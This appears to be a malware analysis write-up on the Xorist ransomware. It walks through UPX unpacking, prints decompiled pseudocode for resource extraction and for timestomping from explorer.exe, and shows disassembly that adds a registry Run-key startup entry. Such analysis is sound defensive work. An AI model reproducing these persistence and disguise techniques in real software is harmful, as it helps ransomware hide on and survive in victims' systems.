# Xorist Ransomware

* [VT Link](https://www.virustotal.com/gui/file/9ac20a04dc317e557f7d67a9cba24fea43b242654d83219dd73e0f0bdef2ff16)
* [VT Link Unpack](https://www.virustotal.com/gui/file/9ac20a04dc317e557f7d67a9cba24fea43b242654d83219dd73e0f0bdef2ff16)

## UPX Packing

The malware is a program compressed with UPX. We will simply decompress it using the UPX program.

![dupx](/images/xorist/dupx.png)

And malware is a simple PE32 file from 2012 :)

![dupx](/images/xorist/diec.png)

## Analyze

### Heap Process

```cpp
 hHeap = GetProcessHeap();
 sub_401F87();

BOOL sub_401F87()
{
  HRSRC ResourceA; // eax
  DWORD v1; // eax
  HGLOBAL Resource; // eax
  SIZE_T *v3; // eax
  SIZE_T *v4; // edi
  SIZE_T v5; // ebx
  SIZE_T *v6; // edi
  LPVOID v7; // eax
  SIZE_T *v8; // edi
  SIZE_T v9; // ebx
  SIZE_T *v10; // edi
  const CHAR *v11; // eax
  SIZE_T *v12; // edi
  SIZE_T v13; // ebx
  SIZE_T *v14; // edi
  const CHAR *v15; // eax
  SIZE_T v16; // edi
  HRSRC hResInfo; // [esp+4h] [ebp-10h]
  DWORD v19; // [esp+8h] [ebp-Ch]
  HGLOBAL hResData; // [esp+Ch] [ebp-8h]

  ResourceA = FindResourceA(0, (LPCSTR)0xE, (LPCSTR)2);
  if ( !ResourceA )
    goto LABEL_9;
  hResInfo = ResourceA;
  v1 = SizeofResource(0, ResourceA);
  if ( !v1 )
    goto LABEL_9;
  v19 = v1;
  Resource = LoadResource(0, hResInfo);
  if ( !Resource )
    goto LABEL_9;
  hResData = Resource;
  v3 = (SIZE_T *)LockResource(Resource);
  if ( !v3 )
    goto LABEL_9;
  v4 = v3;
  RtlMoveMemory(&dword_406DB9, v3, 16);
  v4 += 4;
  sub_40211B(v4, v19 - 16);
  v5 = *v4;
  v6 = v4 + 1;
  v7 = HeapAlloc(hHeap, 8u, v5);
  if ( !v7 )
    goto LABEL_9;
  dword_407519 = (int)v7;
  RtlMoveMemory(v7, v6, v5);
  v8 = (SIZE_T *)((char *)v6 + v5);
  v9 = *v8;
  v10 = v8 + 1;
  v11 = (const CHAR *)HeapAlloc(hHeap, 8u, v9);
  if ( !v11
    || (lpText = v11,
        RtlMoveMemory(v11, v10, v9),
        v12 = (SIZE_T *)((char *)v10 + v9),
        v13 = *v12,
        v14 = v12 + 1,
        (v15 = (const CHAR *)HeapAlloc(hHeap, 8u, v13)) == 0) )
  {
LABEL_9:
    JUMPOUT(0x402330);
  }
  lpSubKey = v15;
  RtlMoveMemory(v15, v14, v13);
  v16 = (SIZE_T)v14 + v13;
  RtlMoveMemory(&unk_406DC9, v16, 16);
  v16 += 16;
  RtlMoveMemory(&byte_407529, v16, 5);
  v16 += 5;
  RtlMoveMemory(byte_406DD9, v16, 16);
  v16 += 16;
  RtlMoveMemory(byte_406DE9, v16, 16);
  v16 += 16;
  RtlMoveMemory(&dword_407525, v16, 4);
  v16 += 4;
  RtlMoveMemory(&dword_4065A5, v16, 4);
  v16 += 4;
  RtlMoveMemory(&lDistanceToMove, v16, 4);
  RtlMoveMemory(&nNumberOfBytesToRead, v16 + 4, 4);
  return FreeResource(hResData);
}

```

This code is a Windows function that extracts and manipulates data from a resource embedded in the executable file. The extracted data is then copied to various memory locations for further processing.

### Setup process

```cpp
BOOL sub_402472()
{
  HANDLE hFile; // [esp+0h] [ebp-4h]

  GetWindowsDirectoryA(byte_40755E, 0x200u);
  PathAddBackslashA(byte_40755E);
  lstrcatA(byte_40755E, aExplorerExe);
  hFile = CreateFileA(byte_40755E, 0x80000000, 1u, 0, 3u, 0, 0);
  GetFileTime(hFile, &CreationTime, &LastAccessTime, &LastWriteTime);
  return CloseHandle(hFile);
}
```

The malware will retrieve the creation/modification date information of explorer.exe located in the Windows directory. And place the same information into a copy of itself in the Temporary folder under the name QLUm8OR6vUIE1wP.exe.

![copy-temp](/images/xorist/copy-temp.png)

It will add a registry key to start itself upon each startup.

```
push myfile-ok.405950                   ; "C:\\Users\\Admin\\AppData\\Local\\Temp\\QLUm8OR6vUIE1wP.exe"
push myfile-ok.4043D4                   ; "Alcmeter"
push myfile-ok.4043A6                   ; "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
push 80000002                           ; 
call myfile-ok.402422                   ;

push ebp
mov ebp,esp
add esp,FFFFFFF8
lea eax,dword ptr ss:[ebp-4]
push eax
lea eax,dword ptr ss:[ebp-8]
push eax
push 0
push 2001F
push 0
push myfile-ok.404379
push 0
push dword ptr ss:[ebp+C]
push dword ptr ss:[ebp+8]
call <JMP.&RegCreateKeyExA>
push dword ptr ss:[ebp+14]
call <JMP.&lstrlen>
push eax
push dword ptr ss:[ebp+14]
push 1
push 0
push dword ptr ss:[ebp+10]
push dword ptr ss:[ebp-8]
call <JMP.&RegSetValueExA>
push dword ptr ss:[ebp-8]
call <JMP.&RegCloseKey>
```





